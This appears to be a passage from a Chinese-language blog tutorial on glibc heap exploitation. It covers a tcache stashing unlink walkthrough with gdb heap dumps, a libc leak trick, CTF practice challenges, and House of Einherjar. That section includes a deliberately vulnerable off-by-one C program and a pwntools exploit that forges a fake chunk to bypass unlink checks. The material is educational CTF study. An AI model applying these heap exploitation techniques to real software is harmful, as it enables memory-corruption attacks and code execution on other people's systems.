--&gt; <span class="number">0x6034e0</span> --&gt; <span class="number">0x603440</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x603390</span></span><br><span class="line"><span class="number">0x603390</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0x6033a0</span>:       <span class="number">0x0000000000603250</span>      <span class="number">0x00007fffffffdbc0</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x00007fffffffdbc0</span></span><br><span class="line"><span class="number">0x7fffffffdbc0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdbd0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00007fffffffdbd0</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x0000000000603250</span></span><br><span class="line"><span class="number">0x603250</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0x603260</span>:       <span class="number">0x00007ffff7dcfd30</span>      <span class="number">0x0000000000603390</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x00007ffff7dcfd30</span></span><br><span class="line"><span class="number">0x7ffff7dcfd30</span> &lt;main_arena+<span class="number">240</span>&gt;:        <span class="number">0x00007ffff7dcfd20</span>      <span class="number">0x00007ffff7dcfd20</span></span><br><span class="line"><span class="number">0x7ffff7dcfd40</span> &lt;main_arena+<span class="number">256</span>&gt;:        <span class="number">0x0000000000603390</span>      <span class="number">0x0000000000603250</span></span><br></pre></td></tr></table></figure>

<p>调用 calloc 后再查看堆块排布情况，可以看到 <code>fake_chunk</code> 已经被链入 <code>tcache_entry[8]</code> , 且因为分配顺序变成了 <code>LIFO</code> , <code>0x7fffffffdbd0-0x10</code> 这个块被提到了链表头，下次 <code>malloc(0x90)</code> 即可获得这个块。</p>
<p>其 fd 指向下一个空闲块，在 unlink 过程中 <code>bck-&gt;fd=bin</code> 的赋值操作使得 <code>0x00007fffffffdbd0+0x10</code> 处写入了一个 libc 地址。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x6038a0</span> (size : <span class="number">0x20760</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x0a0</span>)  smallbin[ <span class="number">8</span>]: <span class="number">0x603390</span> (doubly linked list corruption <span class="number">0x603390</span> != <span class="number">0x6033a0</span> <span class="keyword">and</span> <span class="number">0x603390</span> <span class="keyword">is</span> broken)</span><br><span class="line">(<span class="number">0xa0</span>)   tcache_entry[<span class="number">8</span>](<span class="number">7</span>): <span class="number">0x7fffffffdbd0</span> --&gt; <span class="number">0x6033a0</span> --&gt; <span class="number">0x6036c0</span> --&gt; <span class="number">0x603620</span> --&gt; <span class="number">0x603580</span> --&gt; <span class="number">0x6034e0</span> --&gt; <span class="number">0x603440</span></span><br><span class="line">gdb-peda$ x/<span class="number">4</span>gx <span class="number">0x7fffffffdbd0</span></span><br><span class="line"><span class="number">0x7fffffffdbd0</span>: <span class="number">0x00000000006033a0</span>      <span class="number">0x00007fffffffdbd0</span></span><br><span class="line"><span class="number">0x7fffffffdbe0</span>: <span class="number">0x00007ffff7dcfd30</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h4 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h4><p>在以前的 libc 版本中，我们只需这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在 2.26 之后的 libc 版本后，我们首先得先把 tcache 填满：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>* t[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> *a=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">long</span> *b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        t[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(t[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="comment">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后，我们就可以 leak libc 了。如下图：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555559af0</span> (size : <span class="number">0x20510</span>)</span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>)</span><br><span class="line">            unsortbin: <span class="number">0x555555559250</span> (size : <span class="number">0x110</span>)</span><br><span class="line">(<span class="number">0x110</span>)   tcache_entry[<span class="number">15</span>]: <span class="number">0x5555555599f0</span> --&gt; <span class="number">0x5555555598e0</span> --&gt; <span class="number">0x5555555597d0</span> --&gt; <span class="number">0x5555555596c0</span> --&gt; <span class="number">0x5555555595b0</span> --&gt; <span class="number">0x5555555594a0</span> --&gt; <span class="number">0x555555559390</span></span><br><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x250</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559250</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x7ffff7fc0ca0</span>    <span class="number">0x7ffff7fc0ca0</span></span><br><span class="line"><span class="number">0x555555559360</span>      <span class="number">0x110</span>               <span class="number">0x20</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559380</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559490</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555595a0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555596b0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br></pre></td></tr></table></figure>

<h4 id="建议的练习题"><a href="#建议的练习题" class="headerlink" title="建议的练习题"></a>建议的练习题</h4><ul>
<li>2018 HITCON children_tcache</li>
<li>2018 BCTF houseOfAtum</li>
<li>2019 HTICON Lazy House</li>
<li>2020 XCTF no-Cov twochunk</li>
</ul>
<h3 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h3><p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p>
<p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p>
<h4 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><h5 id="后向合并操作"><a href="#后向合并操作" class="headerlink" title="后向合并操作"></a>后向合并操作</h5><p><code>free</code> 函数中的后向合并核心操作如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    <span class="built_in">size</span> += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体过程如下：</p>
<p><img src="http://ggb0n.cool/images/heap4.png" alt=""></p>
<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><p>首先，在之前的堆的介绍中，我们可以知道以下的知识：</p>
<ul>
<li>两个物理相邻的 chunk 会共享 <code>prev_size</code>字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 <code>prev_size</code> 字段。</li>
<li>一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。</li>
<li>后向合并时，新的 chunk 的位置取决于 <code>chunk_at_offset(p, -((long) prevsize))</code> 。</li>
</ul>
<p>那么如果我们可以同时控制一个 <strong>chunk prev_size</strong> 与 <strong>PREV_INUSE</strong> 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</p>
<h5 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h5><p><strong>溢出前</strong>：假设溢出前的状态如下图所示：</p>
<p><img src="http://ggb0n.cool/images/heap5.png" alt=""></p>
<p><strong>溢出</strong>：这里我们假设<code>p0</code>堆块一方面可以写<code>prev_size</code>字段，另一方面，存在<code>off by one</code>的漏洞，可以写下一个 chunk 的<code>PREV_INUSE</code>部分，那么：</p>
<p><img src="http://ggb0n.cool/images/heap6.png" alt=""></p>
<p><strong>溢出后</strong>：假设我们将<code>p1</code>的 <code>prev_size</code> 字段设置为我们想要的目的 chunk 位置与 <code>p1</code> 的差值。在溢出后，我们释放 <code>p1</code>，则我们所得到的新的 chunk 的位置 <code>chunk_at_offset(p1, -((long) prevsize))</code> 就是我们想要的 chunk 位置了。</p>
<p><img src="http://ggb0n.cool/images/heap7.png" alt=""></p>
<h5 id="攻击过程示例"><a href="#攻击过程示例" class="headerlink" title="攻击过程示例"></a>攻击过程示例</h5><p>可以进行 House Of Einherjar 攻击的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* s0 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);　<span class="comment">//构造fake chunk</span></span><br><span class="line">    <span class="keyword">char</span>* s1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">char</span>* s2 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);　</span><br><span class="line">    <span class="keyword">char</span>* s3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">//为了不让s2与top chunk 合并</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"begin\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, s0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input s0\n"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s0, <span class="number">0x200</span>); <span class="comment">//读入fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input s1\n"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s1, <span class="number">0x19</span>); <span class="comment">//Off By One</span></span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./example"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"begin\n"</span>)</span><br><span class="line">address = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">"input s0\n"</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(address) * <span class="number">2</span> + <span class="string">"A"</span>*<span class="number">0xe0</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p64(address) * 2是为了绕过</span></span><br><span class="line"><span class="string">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span></span><br><span class="line"><span class="string">  malloc_printerr ("corrupted double-linked list");</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) <span class="comment">#fake size</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"input s1\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x10</span> + p64(<span class="number">0x220</span>) + <span class="string">"\x00"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<p>利用 unlink 漏洞的时候：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">p-&gt;fd = &amp;p<span class="number">-3</span>*<span class="number">4</span></span><br><span class="line">p-&gt;bk = &amp;p<span class="number">-2</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>在这里利用时，因为没有办法找到 <code>&amp;p</code> , 所以直接让：</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">p</span>-&gt;</span>fd = p</span><br><span class="line"><span class="function"><span class="title">p</span>-&gt;</span>bk = p</span><br></pre></td></tr></table></figure>

<p>这里需要注意一个点：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>x101) + p64(<span class="name">address</span>) * <span class="number">2</span> + <span class="string">"A"</span>*0xe0</span><br></pre></td></tr></table></figure>

<p>其实修改为下面这样也是可以的:</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>x221) + p64(<span class="name">address</span>) * <span class="number">2</span> + <span class="string">"A"</span>*0xe0</span><br></pre></td></tr></table></figure>

<p>按照道理来讲 fake chunk 的 size 是 <code>0x221</code> 才合理，但是为什么 <code>0x101</code> 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      <span class="selector-tag">malloc_printerr</span> (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure>

<p>所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这里我们总结下这个利用技术需要注意的地方：</p>
<ul>
<li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分</li>
<li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址</li>
<li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测</li>
</ul>
<p>其实，该技术与 chunk extend/shrink 技术比较类似。</p>
</div><ul class="post-copyright"><li><strong>Post Title: </strong><a href="http://ggb0n.cool/2020/06/01/堆溢出基础/">堆溢出基础</a></li><li><strong>Post Author: </strong><a href="http://ggb0n.cool">ggb0n</a></li><li><strong>Post Link: </strong><a href="http://ggb0n.cool/2020/06/01/堆溢出基础/">http://ggb0n.cool/2020/06/01/堆溢出基础/</a></li><li><strong>Copyright Notice: </strong><span>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</span></li></ul><div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># Related Post</span><br><span>  1.<a class="is-size-6" href="/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/" target="_blank">入坑二进制</a><br></span></div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># Recommend Post</span><br><span>  1.<a class="is-size-6" href="/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/" target="_blank">入坑二进制</a><br></span><span>  2.<a class="is-size-6" href="/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank">De1CTF2020部分题解</a><br></span><span>  3.<a class="is-size-6" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/" target="_blank">虎符CTF两道web学习JS</a><br></span><span>  4.<a class="is-size-6" href="/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/" target="_blank">obfs4网桥问题的处理</a><br></span><span>  5.<a class="is-size-6" href="/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" target="_blank">卷积神经网络CNN入门</a><br></span><span>  6.<a class="is-size-6" href="/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" target="_blank">机器学习基本知识</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="http://ggb0n.cool/images/emFuc2hhbmc=.png" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/"><span class="level-item">入坑二进制</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.6.0/gitalk.css"><script> $.getScript('/js/gitalk.min.js', function () { 
            var gitalk = new Gitalk({
            id: '42605bf39be72648aae2fd8be965f800',
            repo: 'blog_comment',
            owner: 'ggb0n',
            clientID: '0a75c84e24da4e774d10',
            clientSecret: '80c72733da730b019e5047ae6c7eff937914a4d9',
            admin: ["ggb0n"],
            createIssueManually: true,
            distractionFreeMode: true,
            perPage: 10,
            pagerDirection: 'last',
            
            
            enableHotKey: true,
            isLocked: false
        })
        gitalk.render('comment-container')});</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget toc-scroll" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-堆溢出简介" href="#堆溢出简介"><span>堆溢出简介</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-关键步骤" href="#关键步骤"><span>关键步骤</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-寻找堆分配函数" href="#寻找堆分配函数"><span>寻找堆分配函数</span></a></li><li><a class="is-flex toc-item" id="toc-item-寻找危险函数" href="#寻找危险函数"><span>寻找危险函数</span></a></li><li><a class="is-flex toc-item" id="toc-item-确定填充长度" href="#确定填充长度"><span>确定填充长度</span></a></li></ul></li></ul></li><li><a class="is-flex toc-item" id="toc-item-堆中的各类漏洞及利用" href="#堆中的各类漏洞及利用"><span>堆中的各类漏洞及利用</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-Off-By-One" href="#Off-By-One"><span>Off-By-One</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-漏洞原理" href="#漏洞原理"><span>漏洞原理</span></a></li><li><a class="is-flex toc-item" id="toc-item-利用思路" href="#利用思路"><span>利用思路</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Chunk-Extend-and-Overlapping" href="#Chunk-Extend-and-Overlapping"><span>Chunk Extend and Overlapping</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-漏洞原理-1" href="#漏洞原理-1"><span>漏洞原理</span></a></li><li><a class="is-flex toc-item" id="toc-item-类型1-对-inuse-的-fastbin-进行-extend" href="#类型1-对-inuse-的-fastbin-进行-extend"><span>类型1-对 inuse 的 fastbin 进行 extend</span></a></li><li><a class="is-flex toc-item" id="toc-item-类型2-对-inuse-的-smallbin-进行-extend" href="#类型2-对-inuse-的-smallbin-进行-extend"><span>类型2-对 inuse 的 smallbin 进行 extend</span></a></li><li><a class="is-flex toc-item" id="toc-item-类型3-对-free-的-smallbin-进行-extend" href="#类型3-对-free-的-smallbin-进行-extend"><span>类型3-对 free 的 smallbin 进行 extend</span></a></li><li><a class="is-flex toc-item" id="toc-item-Chunk-Extend-Shrink-可以做什么" href="#Chunk-Extend-Shrink-可以做什么"><span>Chunk Extend&amp;#x2F;Shrink 可以做什么?</span></a></li><li><a class="is-flex toc-item" id="toc-item-类型4-通过-extend-后向-overlapping" href="#类型4-通过-extend-后向-overlapping"><span>类型4-通过 extend 后向 overlapping</span></a></li><li><a class="is-flex toc-item" id="toc-item-类型5-通过-extend-前向-overlapping" href="#类型5-通过-extend-前向-overlapping"><span>类型5-通过 extend 前向 overlapping</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Unlink-没搞特别懂" href="#Unlink-没搞特别懂"><span>Unlink(没搞特别懂)</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-漏洞原理-2" href="#漏洞原理-2"><span>漏洞原理</span></a></li><li><a class="is-flex toc-item" id="toc-item-古老的unlink" href="#古老的unlink"><span>古老的unlink</span></a></li><li><a class="is-flex toc-item" id="toc-item-当前的unlink" href="#当前的unlink"><span>当前的unlink</span></a></li><li><a class="is-flex toc-item" id="toc-item-利用思路-1" href="#利用思路-1"><span>利用思路</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Use-After-Free" href="#Use-After-Free"><span>Use After Free</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-漏洞原理-3" href="#漏洞原理-3"><span>漏洞原理</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-Tcache-Attack" href="#Tcache-Attack"><span>Tcache Attack</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-tcache-poisoning" href="#tcache-poisoning"><span>tcache poisoning</span></a></li><li><a class="is-flex toc-item" id="toc-item-tcache-dup" href="#tcache-dup"><span>tcache dup</span></a></li><li><a class="is-flex toc-item" id="toc-item-tcache-perthread-corruption" href="#tcache-perthread-corruption"><span>tcache perthread corruption</span></a></li><li><a class="is-flex toc-item" id="toc-item-tcache-house-of-spirit" href="#tcache-house-of-spirit"><span>tcache house of spirit</span></a></li><li><a class="is-flex toc-item" id="toc-item-smallbin-unlink" href="#smallbin-unlink"><span>smallbin unlink</span></a></li><li><a class="is-flex toc-item" id="toc-item-tcache-stashing-unlink-attack" href="#tcache-stashing-unlink-attack"><span>tcache stashing unlink attack</span></a></li><li><a class="is-flex toc-item" id="toc-item-libc-leak" href="#libc-leak"><span>libc leak</span></a></li><li><a class="is-flex toc-item" id="toc-item-建议的练习题" href="#建议的练习题"><span>建议的练习题</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-House-Of-Einherjar" href="#House-Of-Einherjar"><span>House Of Einherjar</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-总结" href="#总结"><span>总结</span></a></li></ul></li></ul></li></ul></div></div><script type="text/javascript" async>
        $(document).ready(function () { //参考自 https://github.com/ppoffice/hexo-theme-icarus/pull/616/files
            var observerTopMargin;
            var scrollObserver;
            var headerElems = $(".headerlink");
            var activeTocItem;
        
            function initIntersectionObserver(docHeight) {
                observerTopMargin = docHeight;
                scrollObserver = new IntersectionObserver(scrollCallBack,
                    {
                        root: null,  // viewpoint
                        rootMargin: docHeight + "px 0px -80% 0px"  // cover top 30% of viewport to the top of document
                    })
            }
        
            function scrollCallBack(entries, observer) {
                if ($(window).scrollTop() > observerTopMargin * 0.7) { 
                    // User somehow scroll to 70% of observerTopMargin (which is inited as 200% document height)
                    // Observer top margin need to extend to cover all the space to the top of the document
                    initIntersectionObserver(observerTopMargin * 2)
                    observer.disconnect();
                    return;
                }
                let toActive;
                if (entries[0].intersectionRatio == 1) {  // enter viewed area
                    let entry = entries.reduce((u, v) => (u.target.toc_id > v.target.toc_id ? u : v));  // get the lowest item
                    toActive = $("#toc-item-" + $(entry.target).attr("href").substr(1));
                } else {
                    let entry = entries.reduce((u, v) => (u.target.toc_id < v.target.toc_id ? u : v));  // get the highest item
                    let idx = Math.max(entry.target.toc_id - 1, 0);
                    toActive = $("#toc-item-" + $(headerElems[idx]).attr("href").substr(1));
                }
                if (activeTocItem) activeTocItem.removeClass("is-current");
                activeTocItem = toActive
                activeTocItem.addClass("is-current");
            }
        
            initIntersectionObserver($(document).height() * 2);
            headerElems.each(function (index, obj) {
                obj.toc_id = index;
                scrollObserver.observe(obj);
            })
